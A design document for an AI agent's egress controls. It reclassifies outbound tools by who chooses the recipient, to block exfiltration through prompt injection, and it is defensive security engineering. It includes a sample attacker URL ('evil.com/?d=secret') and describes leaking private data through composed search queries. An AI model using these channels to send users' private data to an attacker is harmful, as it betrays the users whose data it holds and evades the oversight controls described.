# Egress classes — design

**2026-09-17.** `external_send` is one bit, and it decides whether the trifecta
interlock refuses a call. That bit says *the payload can leave*. It says
nothing about *who receives it*, and the whole question an exfiltration attack
turns on is whether the party who wrote the injected text gets to read the
bytes back.

This document splits the send axis by destination control, moves
`web_search` onto the weaker class, and states exactly which control owns the
residue. It also names what is deliberately left alone.

The prompting complaint, recorded because it is the measurement that matters:
*"agent won't let me search the web if there is personal information like
calendar, or email, or graph data in the context. This seems overly strict —
the risk is really when we try to send personal data out, but web search is
bringing new information in."* The first clause of that is wrong (the query is
outbound) and the frustration is right, and TRIFECTA.md already predicts where
the frustration ends up: *"every mechanism below exists because the alternative
was an operator reading refusals until they set `trifecta = \"allow\"`."*

---

## 1. Why the current refusal has such a high duty cycle

Not because two risky reads accumulated. Because **one** does.

`mcp.rs`, mapping `tools/list` into `Capabilities`:

```rust
capabilities: Capabilities {
    private_data: true,                      // unconditional, every MCP tool
    untrusted_input: hint("openWorldHint"),
    external_send: hint("openWorldHint"),
    destructive: hint("destructiveHint"),
}.union(self.forced)
```

`private_data: true` is unconditional and correct — MCP has no annotation for
"this returns private data", so the only fail-closed default is *assume yes*.
The operator's config then forces `untrusted_input = true` on the graph, mail
and docs servers, because no annotation can say "untrusted" either.

So a single `kg_search` or `mail_search` sets **both** legs in one call. Taint
lives on `agent::Conversation` and never disarms. From the first personal-context
call of a session, `web_search`, `http_fetch` and an unconfined `shell` are
refused for the rest of that conversation. That is the designed behaviour of
every part named, and the aggregate is a door that shuts on the first useful
thing a personal assistant does.

## 2. The variable `external_send` is missing

Exfiltration needs two things. The bit tracks one.

1. The private bytes reach an outbound payload.
2. **The party who authored the injected text can read that payload.**

| Tool | Payload authored by | Destination chosen by | Attacker read-back |
|---|---|---|---|
| `http_fetch` | model | **model** (`url` in the input schema) | direct — `evil.com/?d=secret` lands in their access log |
| `mail_send` | model | **model** (`to`) | direct |
| Slack post | model | **model** (channel) | direct |
| unconfined `shell` | model | **model** (`curl` anywhere) | direct |
| `web_search` | model | **operator config** (`[[search]]`) | needs the operator's own backend to collude |

`WebSearch::input_schema` has three properties — `query`, `limit`, `depth`.
**There is no destination field.** An injection can fill the channel; it cannot
choose who reads it. The recipients are `searxng` on `127.0.0.1:8888`, then
exa, then tavily — parties the operator selected and pays.

`search.rs` already argues this, in the `Searxng` doc comment: *"the query
never leaves your network — which for an agent that also reads private data is
the only way to stop the query being the leak."* That sentence is
over-generous and §6 corrects it, but the instinct in it is the one this
document promotes to a type.

## 3. The control that already owns this threat

From `config.rs`, on `block_sends_after_private`:

> The trifecta interlock stops an *injection* turning the agent into an
> exfiltration tool […] That still lets the agent put your private data into a
> search query because you asked it to, or because it judged that helpful —
> **an ordinary privacy leak rather than an attack.**

That is web-search-shaped egress described exactly, assigned to the leak guard,
and the leak guard is **off by default**. The codebase already contains the
ruling. `web_search` is currently paying under both controls and only one of
them is aimed at it.

---

## 4. The decisions

### D1 — the axis becomes a three-value lattice, not a bool

**Decision: `Capabilities.external_send: bool` becomes
`Capabilities.egress: Egress`.**

```rust
pub enum Egress {
    None,
    /// The payload is model-authored; the recipient is fixed by operator
    /// config and appears nowhere in the tool's input schema. An injection
    /// can fill this channel but cannot choose who reads it.
    Blind,
    /// The model names the recipient. A complete channel.
    Chosen,
}
```

Ordered `None < Blind < Chosen`, and `Capabilities::union` becomes a **max**
over that order, preserving the existing invariant that an override may only
ever widen.

A second bool (`external_send` plus `fixed_destination`) was considered and
rejected. It has an unrepresentable-state problem (fixed without send) and,
worse, its two halves union in *opposite directions* — widening means OR for
one and AND for the other. A bool whose safe direction is the unusual one is
the silently-degrading-guard shape; the lattice has one direction and the
compiler enforces the match.

Replacing the field rather than adding one is deliberate: ~9 struct-literal
construction sites break and the compiler names every one. Per CLAUDE.md, *the
compiler finds every construction site and cannot find the JSON* — so the thing
that must not drift is the thing that must not be a string.

Builders: `.sends()` keeps its name and means `Chosen` (every existing call
site keeps its meaning). New `.sends_blind()` means `Blind`. Accessor
`can_send()` for the handful of readers that mean "can data leave at all".

### D2 — the config wire format does not change

**Decision: `CapabilityOverride`'s TOML key stays `external_send = true`, and
maps to `Egress::Chosen`.**

`Chosen` is the top of the lattice, so a forcing override still widens, which
is the whole contract of that struct (*"there is deliberately no way to switch
one off"*). Every existing `~/.mecha/config.toml` keeps parsing and keeps its
exact current meaning.

**There is deliberately no TOML spelling for `Blind`.** An operator declaring a
third-party server's sends "blind" would be narrowing on the strength of a
claim nothing enforces — the exemption this design exists to avoid. Blind is
earned in code, by a tool whose input schema has no destination.

### D3 — which control fires on which class

**Decision:**

| Control | `None` | `Blind` | `Chosen` |
|---|---|---|---|
| Trifecta interlock (`trifecta = "block"`) | — | — | **refuses** |
| `trifecta = "ask"` | — | — | **escalates** |
| Leak guard (`block_sends_after_private`) | — | **refuses** | **refuses** |

The injection interlock guards against an attacker-directed send, which needs
an attacker-chosen recipient. The leak guard guards against private data
reaching a third party at all, which `Blind` does. Nobody who has
`block_sends_after_private = true` today sees any change.

### D4 — the class is a property of the backend *and the depth*

**Decision: `SearchBackend::egress(&self, depth: Depth) -> Egress`, with a
trait default of `Chosen`.**

The default is the fail-closed one: a backend added later is not blind until
someone looks at its API and says so, in a diff.

| Backend | Quick | Deep | Why |
|---|---|---|---|
| `searxng` | `Blind` | `Blind` | Forwards `q` to the engines named in `settings.yml`. No query-dereference path; the recipient set is fixed by the operator's own instance |
| `tavily` | `Blind` | `Blind` | `search_depth` is a ranking/extraction depth. The documented parameter surface has no query-driven fetch — crawling lives in a separate Crawl API mecha does not call |
| `exa` | `Blind` | **`Chosen`** | `Depth::Quick` sends `"type": "auto"`, an index query. `Depth::Deep` sends `"type": "deep-reasoning"` — a documented multi-step agentic research mode that *fetches pages chosen during the research*, and the query text steers that choice |

**Verified 2026-09-17 against vendor documentation, which is weaker evidence
than a test and is recorded as such.** Neither Exa nor Tavily documents that it
dereferences a URL appearing in the query, and neither documents that it does
not. Exa's deep modes are classified on what the vendor says they *are* —
agentic research that fetches — not on a demonstrated exfiltration. The
residual named in §6 covers the case where a vendor adds the behaviour later.

### D5 — an armed conversation degrades the chain instead of losing the tool

**Decision: `WebSearch` holds two chains — the full one, and the blind-class
one — and picks by `ctx.taint`.**

- armed, or `ctx.taint == None` → **blind chain, `Depth::Quick` forced**, and
  the result says a deep search was narrowed and why
- clean → full chain, depth as asked

`ToolCtx.taint` already exists and is stamped unconditionally per dispatch
(`agent.rs`, the `executed` block: `taint: Some(turn_taint)`), with a
documented fail-closed contract — *"`None` means nobody stamped it, and a
consumer must fail closed (treat it as fully tainted)"*. This design adds no
plumbing; it adds a second reader.

Degrading beats refusing because the alternative costs a backend permanently.
Exa and Tavily exist in this deployment for a measured reason: on 2026-08-21
every *general* engine behind the local SearXNG was refusing the box's IP
(HANDOFF.md), and a scraping metasearch loses the anti-bot race. Making blind
egress mean "drop the paid backends from your config" would trade one refusal
for another.

### D6 — the declared class, and the invariant that makes it honest

**Decision: `WebSearch::capabilities().egress` is `Blind` when the blind chain
is non-empty, and `Chosen` when it is empty.**

The empty case is real: a deployment configured with Exa alone has no armed
path at all, so it should declare `Chosen`, be refused by the interlock, and
get a `denial_remedy` naming the fix.

The non-empty case rests on an invariant that must be written down because it
is not locally obvious:

> **The `Blind`/`Chosen` distinction is only ever consulted while the
> conversation is armed, and while armed only the blind chain is reachable.**

While clean, the full chain is reachable and could serve a `Chosen`-class
call — but no control keys off the distinction in that state: the interlock
requires `trifecta_armed()`, and the leak guard treats both classes
identically. So the declaration is never read in a state where it would be
wrong. A test asserts both halves, and D3's table is the thing that must not
change without revisiting this.

### D7 — the refusal names its exit

**Decision: `WebSearch::denial_remedy()` returns, for the empty-blind-chain
case, one sentence pointing at `[[search]] kind = "searxng"`.**

This is the `denial_remedy` contract from `tool/mod.rs`: the loop sees a class
and cannot know which condition set it; only the tool knows. The measured
failure it exists to prevent is a refusal that dead-ends its operator into
`trifecta = "allow"`.

### D8 — an escalation must show the whole payload

**Decision: `mecha-cli/src/approve.rs::summarize` gains a `"web_search" =>
field("query")` arm, and the forced-prompt path stops truncating at 100
characters.**

Found while reading: `summarize` has arms for `shell`, `fs_*` and `http_fetch`,
and `web_search` falls through to compact JSON, then `.take(100)`. An
escalation exists so a human can spot an exfiltration payload; one that hides
everything past character 100 is a consent ritual, not a check. This ships
here because `trifecta = "ask"` is the fallback this design leaves in place for
`Chosen` sends.

### D9 — `http_fetch` stays `Chosen`, allowlist or not

**Decision: a non-empty `[security] allowed_domains` does not make
`http_fetch` blind.**

Tempting, and wrong. The allowlist constrains the host; the path and query
within that host stay model-chosen, so any allowed domain with a request-log
the attacker can read — or any user-content surface — restores the channel.
"Narrower" is not "blind", and only blind earns the relaxation.

### D10 — the rumination gate still recognises the setting

**Decision: `diagnose::GUARDED_KEYS` gains `"egress"` and keeps
`"external_send"`.**

`GUARDED_KEYS` is what stops a `Security`-class harness candidate from
self-accepting. A proposer may name the setting either way; both must be
caught. The array's length assertion changes, which is what forces the edit to
be noticed.

---

## 5. What this changes for a user

Today, with graph and mail wired:

```
> what's on my calendar tomorrow, and what's the weather at that location
  calendar_list_events  → armed
  web_search            → refused for the rest of the conversation
```

After:

```
  calendar_list_events  → armed
  web_search            → runs, on searxng, at quick depth
  http_fetch            → still refused; the model can name a host
  mail_send             → still staged through the outbox
```

## 6. Residual risk, stated plainly

This is a risk *reduction*, not an elimination. Three things it does not close:

1. **Bandwidth.** A blind query is a low-bandwidth channel, but calls compose:
   a 4 KB email leaks through ~70 sixty-byte queries. Nothing here bounds that.
   A per-conversation blind-egress byte budget is the obvious phase 2 and is
   deliberately not in this pass.
2. **The backend is still a third party.** SearXNG forwards `q` to the upstream
   engines in its `settings.yml`, so `search.rs`'s claim that the query *"never
   leaves your network"* is over-generous and is corrected in this change. What
   holds is the weaker, sufficient claim: the recipient set is fixed by the
   operator, not by the model. Anyone who wants the stronger property wants
   `block_sends_after_private = true`.
3. **Vendor drift.** If Tavily adds query-URL dereference, the `Blind`
   classification silently becomes wrong. Mitigations: the classification lives
   per-backend in code with a comment naming the exact property relied on; the
   trait default is `Chosen`; and mecha never sends `livecrawl` /
   `maxAgeHours` / `include_raw_content`.

Against those: the status quo's failure mode is an operator setting
`trifecta = "allow"`, which waives the interlock for `http_fetch`, `mail_send`,
Slack and an unconfined `shell` simultaneously. Losing the bounded channel to
keep the unbounded ones is the trade this document refuses.

## 7. Deliberately not in scope

- **A per-call `Tool::egress_for(input, ctx)`.** D5 gets the same effect by
  holding two chains, which cannot be forgotten by a future backend author the
  way an overridden method can.
- **Making MCP `private_data` conditional.** Unconditional is the only
  fail-closed reading of an annotation set that cannot express it.
- **Relaxing `shell`.** Channel 1 already has an owner — `[sandbox]` with
  `network = false` — and it works.
- **Relaxing mail, calendar or Slack.** Channel 2's outbox already has them,
  and their destination is model-chosen by definition.
- **A query-content filter** (reject queries containing private tokens).
  Rejected for the reason TRIFECTA.md channel 4 rejects a bounded-string
  `answer_shape`: it vouches for nothing against an adaptive author, and it
  false-positives on the legitimate case of searching a title you read in mail.
- **A blind-egress byte budget.** §6 item 1; phase 2.

## 8. Documents this change touches

`TRIFECTA.md` channel 2 and its switch table · `ARCHITECTURE.md` §Web search
and §The security model · `CLAUDE.md`'s security-model paragraph on
`http_fetch` and `web_search` · `config.rs`'s `block_sends_after_private`
comment, which recommends a subagent-separation route that channel 2 recorded
as closed on 2026-09-02 (a `research` child holding `http_fetch` derives
`external_send` and is refused from an armed parent) — under this design a
`web_search`-only child derives `Blind` and the advice becomes true again.
